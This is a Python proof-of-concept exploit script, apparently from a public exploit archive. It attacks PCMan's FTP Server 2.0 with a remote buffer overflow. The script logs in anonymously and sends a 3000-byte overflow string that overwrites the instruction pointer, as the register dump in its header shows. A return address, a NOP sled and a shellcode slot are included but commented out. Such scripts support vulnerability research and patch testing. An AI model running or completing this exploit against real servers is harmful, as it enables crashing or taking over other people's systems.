#!/usr/bin/python
#
#
####################################################################
#
# Exploit Title: PCMan's FTP Server 2.0 Remote Buffer Overflow Exploit
# Date: 2013/6/26
# Exploit Author: Chako
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Download Link: https://files.secureserver.net/1sMltFOsytirTG
# Version: 2.0
# Tested on: Windows 7 SP1 English
#
# EAX 00000000
# ECX 00830A70
# EDX 00000030
# EBX 00000000
# ESP 0018ED70 ASCII "AAAAAAAAAAAAAAAAAAAAA
# EBP 01F214A0
# ESI 0018ED87 ASCII "AAAAAAAAAAAAAAAAAAAAA
# EDI 00000004
# EIP 41414141
#
####################################################################

import socket
import sys

USER    = "anonymous"
PASSWD  = "TEST"

PAYLOAD = "A" * 3000

#EIP     = "\xDB\xFC\x1C\x75"  # 751CFCDB   JMP ESP USER32.DLL
#NOP     = "\x90" * 10

#SHELLCODE =()
print("\n\n[+] PCMan's FTP Server 2.0 Rrmote Buffer Overflow Exploit")
print("[+] Version: V2.0")
print("[+] Chako\n\n\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("11.11.11.9",21))
data = s.recv(1024)


print("[-] Login to FTP Server...\n")
s.send("USER " + USER + '\r\n')
data = s.recv(1024)

s.send("PASS " + PASSWD + '\r\n')
data = s.recv(1024)



print("[-] Sending exploit...\n")
#s.send(PAYLOAD + EIP + NOP +SHELLCODE +'\r\n')
s.send(PAYLOAD +'\r\n')
s.close()

print("[!] Done! Exploit successfully sent\n")
